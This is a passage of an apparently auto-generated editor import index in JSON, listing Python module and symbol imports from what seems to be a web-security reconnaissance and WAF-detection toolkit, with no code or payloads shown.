[
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Style",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Style",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "init",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Style",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "init",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "Style",
        "importPath": "colorama",
        "description": "colorama",
        "isExtraImport": true,
        "detail": "colorama",
        "documentation": {}
    },
    {
        "label": "requests",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "requests",
        "description": "requests",
        "detail": "requests",
        "documentation": {}
    },
    {
        "label": "argparse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "argparse",
        "description": "argparse",
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "ArgumentParser",
        "importPath": "argparse",
        "description": "argparse",
        "isExtraImport": true,
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "Action",
        "importPath": "argparse",
        "description": "argparse",
        "isExtraImport": true,
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "SUPPRESS",
        "importPath": "argparse",
        "description": "argparse",
        "isExtraImport": true,
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "concurrent.futures",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "concurrent.futures",
        "description": "concurrent.futures",
        "detail": "concurrent.futures",
        "documentation": {}
    },
    {
        "label": "ThreadPoolExecutor",
        "importPath": "concurrent.futures",
        "description": "concurrent.futures",
        "isExtraImport": true,
        "detail": "concurrent.futures",
        "documentation": {}
    },
    {
        "label": "as_completed",
        "importPath": "concurrent.futures",
        "description": "concurrent.futures",
        "isExtraImport": true,
        "detail": "concurrent.futures",
        "documentation": {}
    },
    {
        "label": "ThreadPoolExecutor",
        "importPath": "concurrent.futures",
        "description": "concurrent.futures",
        "isExtraImport": true,
        "detail": "concurrent.futures",
        "documentation": {}
    },
    {
        "label": "as_completed",
        "importPath": "concurrent.futures",
        "description": "concurrent.futures",
        "isExtraImport": true,
        "detail": "concurrent.futures",
        "documentation": {}
    },
    {
        "label": "tqdm",
        "importPath": "tqdm",
        "description": "tqdm",
        "isExtraImport": true,
        "detail": "tqdm",
        "documentation": {}
    },
    {
        "label": "tqdm",
        "importPath": "tqdm",
        "description": "tqdm",
        "isExtraImport": true,
        "detail": "tqdm",
        "documentation": {}
    },
    {
        "label": "urllib.parse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urljoin",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urljoin",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlparse",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urljoin",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "urlencode",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "parse_qs",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "quote_plus",
        "importPath": "urllib.parse",
        "description": "urllib.parse",
        "isExtraImport": true,
        "detail": "urllib.parse",
        "documentation": {}
    },
    {
        "label": "sys",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sys",
        "description": "sys",
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "os",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os",
        "description": "os",
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "path",
        "importPath": "os",
        "description": "os",
        "isExtraImport": true,
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "shodan",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "shodan",
        "description": "shodan",
        "detail": "shodan",
        "documentation": {}
    },
    {
        "label": "Shodan",
        "importPath": "shodan",
        "description": "shodan",
        "isExtraImport": true,
        "detail": "shodan",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "timezone",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "urllib3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib3",
        "description": "urllib3",
        "detail": "urllib3",
        "documentation": {}
    },
    {
        "label": "re",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re",
        "description": "re",
        "detail": "re",
        "documentation": {}
    },
    {
        "label": "json",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "json",
        "description": "json",
        "detail": "json",
        "documentation": {}
    },
    {
        "label": "binascii",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "binascii",
        "description": "binascii",
        "detail": "binascii",
        "documentation": {}
    },
    {
        "label": "mmap",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "mmap",
        "description": "mmap",
        "detail": "mmap",
        "documentation": {}
    },
    {
        "label": "jwt",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "jwt",
        "description": "jwt",
        "detail": "jwt",
        "documentation": {}
    },
    {
        "label": "base64",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "base64",
        "description": "base64",
        "detail": "base64",
        "documentation": {}
    },
    {
        "label": "hashlib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "hashlib",
        "description": "hashlib",
        "detail": "hashlib",
        "documentation": {}
    },
    {
        "label": "alive_bar",
        "importPath": "alive_progress",
        "description": "alive_progress",
        "isExtraImport": true,
        "detail": "alive_progress",
        "documentation": {}
    },
    {
        "label": "alive_bar",
        "importPath": "alive_progress",
        "description": "alive_progress",
        "isExtraImport": true,
        "detail": "alive_progress",
        "documentation": {}
    },
    {
        "label": "boto3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "boto3",
        "description": "boto3",
        "detail": "boto3",
        "documentation": {}
    },
    {
        "label": "ClientError",
        "importPath": "botocore.exceptions",
        "description": "botocore.exceptions",
        "isExtraImport": true,
        "detail": "botocore.exceptions",
        "documentation": {}
    },
    {
        "label": "ssl",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ssl",
        "description": "ssl",
        "detail": "ssl",
        "documentation": {}
    },
    {
        "label": "socket",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "socket",
        "description": "socket",
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "subprocess",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "subprocess",
        "description": "subprocess",
        "detail": "subprocess",
        "documentation": {}
    },
    {
        "label": "random",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "random",
        "description": "random",
        "detail": "random",
        "documentation": {}
    },
    {
        "label": "waybackpy",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "waybackpy",
        "description": "waybackpy",
        "detail": "waybackpy",
        "documentation": {}
    },
    {
        "label": "WaybackMachineSaveAPI",
        "importPath": "waybackpy",
        "description": "waybackpy",
        "isExtraImport": true,
        "detail": "waybackpy",
        "documentation": {}
    },
    {
        "label": "UserAgent",
        "importPath": "fake_useragent",
        "description": "fake_useragent",
        "isExtraImport": true,
        "detail": "fake_useragent",
        "documentation": {}
    },
    {
        "label": "UserAgent",
        "importPath": "fake_useragent",
        "description": "fake_useragent",
        "isExtraImport": true,
        "detail": "fake_useragent",
        "documentation": {}
    },
    {
        "label": "time",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "time",
        "description": "time",
        "detail": "time",
        "documentation": {}
    },
    {
        "label": "sleep",
        "importPath": "time",
        "description": "time",
        "isExtraImport": true,
        "detail": "time",
        "documentation": {}
    },
    {
        "label": "string",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "string",
        "description": "string",
        "detail": "string",
        "documentation": {}
    },
    {
        "label": "importlib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "importlib",
        "description": "importlib",
        "detail": "importlib",
        "documentation": {}
    },
    {
        "label": "deepcopy",
        "importPath": "copy",
        "description": "copy",
        "isExtraImport": true,
        "detail": "copy",
        "documentation": {}
    },
    {
        "label": "Payload",
        "importPath": "lib.Payload",
        "description": "lib.Payload",
        "isExtraImport": true,
        "detail": "lib.Payload",
        "documentation": {}
    },
    {
        "label": "Chunked",
        "importPath": "lib.Payload",
        "description": "lib.Payload",
        "isExtraImport": true,
        "detail": "lib.Payload",
        "documentation": {}
    },
    {
        "label": "EndChunk",
        "importPath": "lib.Payload",
        "description": "lib.Payload",
        "isExtraImport": true,
        "detail": "lib.Payload",
        "documentation": {}
    },
    {
        "label": "EasySSL",
        "importPath": "lib.EasySSL",
        "description": "lib.EasySSL",
        "isExtraImport": true,
        "detail": "lib.EasySSL",
        "documentation": {}
    },
    {
        "label": "Fore",
        "importPath": "lib.colorama",
        "description": "lib.colorama",
        "isExtraImport": true,
        "detail": "lib.colorama",
        "documentation": {}
    },
    {
        "label": "Style",
        "importPath": "lib.colorama",
        "description": "lib.colorama",
        "isExtraImport": true,
        "detail": "lib.colorama",
        "documentation": {}
    },
    {
        "label": "lib.settings",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.settings",
        "description": "lib.settings",
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "configure_request_headers",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "auto_assign",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "get_page",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "WAF_REQUEST_DETECTION_PAYLOADS",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "BANNER",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "InvalidURLProvided",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "parse_burp_request",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "parse_googler_file",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "check_version",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "get_encoding_list",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "test_target_connection",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "parse_help_menu",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "export_payloads",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "PLUGINS_DIRECTORY",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "TAMPERS_DIRECTORY",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "check_url_against_cached",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "RESULTS_TEMPLATE",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "display_cached",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "make_saying_pretty",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "SAYING",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "validate_url",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "do_mine_for_whatwaf",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "get_miner_pid",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "auto_update",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "importPath": "lib.settings",
        "description": "lib.settings",
        "isExtraImport": true,
        "detail": "lib.settings",
        "documentation": {}
    },
    {
        "label": "uuid",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "uuid",
        "description": "uuid",
        "detail": "uuid",
        "documentation": {}
    },
    {
        "label": "sqlite3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sqlite3",
        "description": "sqlite3",
        "detail": "sqlite3",
        "documentation": {}
    },
    {
        "label": "lib.formatter",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "error",
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "isExtraImport": true,
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "info",
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "isExtraImport": true,
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "fatal",
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "isExtraImport": true,
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "warn",
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "isExtraImport": true,
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "success",
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "isExtraImport": true,
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "fatal",
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "isExtraImport": true,
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "error",
        "importPath": "lib.formatter",
        "description": "lib.formatter",
        "isExtraImport": true,
        "detail": "lib.formatter",
        "documentation": {}
    },
    {
        "label": "BeautifulSoup",
        "importPath": "bs4",
        "description": "bs4",
        "isExtraImport": true,
        "detail": "bs4",
        "documentation": {}
    },
    {
        "label": "BeautifulSoup",
        "importPath": "bs4",
        "description": "bs4",
        "isExtraImport": true,
        "detail": "bs4",
        "documentation": {}
    },
    {
        "label": "BeautifulSoup",
        "importPath": "bs4",
        "description": "bs4",
        "isExtraImport": true,
        "detail": "bs4",
        "documentation": {}
    },
    {
        "label": "platform",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "platform",
        "description": "platform",
        "detail": "platform",
        "documentation": {}
    },
    {
        "label": "warnings",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "warnings",
        "description": "warnings",
        "detail": "warnings",
        "documentation": {}
    },
    {
        "label": "InsecureRequestWarning",
        "importPath": "requests.packages.urllib3.exceptions",
        "description": "requests.packages.urllib3.exceptions",
        "isExtraImport": true,
        "detail": "requests.packages.urllib3.exceptions",
        "documentation": {}
    },
    {
        "label": "lib.database",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.database",
        "description": "lib.database",
        "detail": "lib.database",
        "documentation": {}
    },
    {
        "label": "initialize",
        "importPath": "lib.database",
        "description": "lib.database",
        "isExtraImport": true,
        "detail": "lib.database",
        "documentation": {}
    },
    {
        "label": "insert_payload",
        "importPath": "lib.database",
        "description": "lib.database",
        "isExtraImport": true,
        "detail": "lib.database",
        "documentation": {}
    },
    {
        "label": "fetch_data",
        "importPath": "lib.database",
        "description": "lib.database",
        "isExtraImport": true,
        "detail": "lib.database",
        "documentation": {}
    },
    {
        "label": "shlex",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "shlex",
        "description": "shlex",
        "detail": "shlex",
        "documentation": {}
    },
    {
        "label": "timeit",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "timeit",
        "description": "timeit",
        "detail": "timeit",
        "documentation": {}
    },
    {
        "label": "Miner",
        "importPath": "lib.miner",
        "description": "lib.miner",
        "isExtraImport": true,
        "detail": "lib.miner",
        "documentation": {}
    },
    {
        "label": "WhatWafParser",
        "importPath": "lib.cmd",
        "description": "lib.cmd",
        "isExtraImport": true,
        "detail": "lib.cmd",
        "documentation": {}
    },
    {
        "label": "request_issue_creation",
        "importPath": "lib.firewall_found",
        "description": "lib.firewall_found",
        "isExtraImport": true,
        "detail": "lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "request_issue_creation",
        "importPath": "lib.firewall_found",
        "description": "lib.firewall_found",
        "isExtraImport": true,
        "detail": "lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "detection_main",
        "importPath": "content",
        "description": "content",
        "isExtraImport": true,
        "detail": "content",
        "documentation": {}
    },
    {
        "label": "encode",
        "importPath": "content",
        "description": "content",
        "isExtraImport": true,
        "detail": "content",
        "documentation": {}
    },
    {
        "label": "getpass",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "getpass",
        "description": "getpass",
        "detail": "getpass",
        "documentation": {}
    },
    {
        "label": "setup",
        "importPath": "setuptools",
        "description": "setuptools",
        "isExtraImport": true,
        "detail": "setuptools",
        "documentation": {}
    },
    {
        "label": "find_packages",
        "importPath": "setuptools",
        "description": "setuptools",
        "isExtraImport": true,
        "detail": "setuptools",
        "documentation": {}
    },
    {
        "label": "setup",
        "importPath": "setuptools",
        "description": "setuptools",
        "isExtraImport": true,
        "detail": "setuptools",
        "documentation": {}
    },
    {
        "label": "find_packages",
        "importPath": "setuptools",
        "description": "setuptools",
        "isExtraImport": true,
        "detail": "setuptools",
        "documentation": {}
    },
    {
        "label": "shutil",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "shutil",
        "description": "shutil",
        "detail": "shutil",
        "documentation": {}
    },
    {
        "label": "which",
        "importPath": "shutil",
        "description": "shutil",
        "isExtraImport": true,
        "detail": "shutil",
        "documentation": {}
    },
    {
        "label": "which",
        "importPath": "shutil",
        "description": "shutil",
        "isExtraImport": true,
        "detail": "shutil",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "modules.favicon",
        "description": "modules.favicon",
        "isExtraImport": true,
        "detail": "modules.favicon",
        "documentation": {}
    },
    {
        "label": "ThreadPool",
        "importPath": "multiprocessing.pool",
        "description": "multiprocessing.pool",
        "isExtraImport": true,
        "detail": "multiprocessing.pool",
        "documentation": {}
    },
    {
        "label": "useragent_list",
        "importPath": "modules",
        "description": "modules",
        "isExtraImport": true,
        "detail": "modules",
        "documentation": {}
    },
    {
        "label": "sub_output",
        "importPath": "modules",
        "description": "modules",
        "isExtraImport": true,
        "detail": "modules",
        "documentation": {}
    },
    {
        "label": "search",
        "importPath": "googlesearch",
        "description": "googlesearch",
        "isExtraImport": true,
        "detail": "googlesearch",
        "documentation": {}
    },
    {
        "label": "Queue",
        "importPath": "queue",
        "description": "queue",
        "isExtraImport": true,
        "detail": "queue",
        "documentation": {}
    },
    {
        "label": "defaultdict",
        "importPath": "collections",
        "description": "collections",
        "isExtraImport": true,
        "detail": "collections",
        "documentation": {}
    },
    {
        "label": "threading",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "threading",
        "description": "threading",
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "Semaphore",
        "importPath": "threading",
        "description": "threading",
        "isExtraImport": true,
        "detail": "threading",
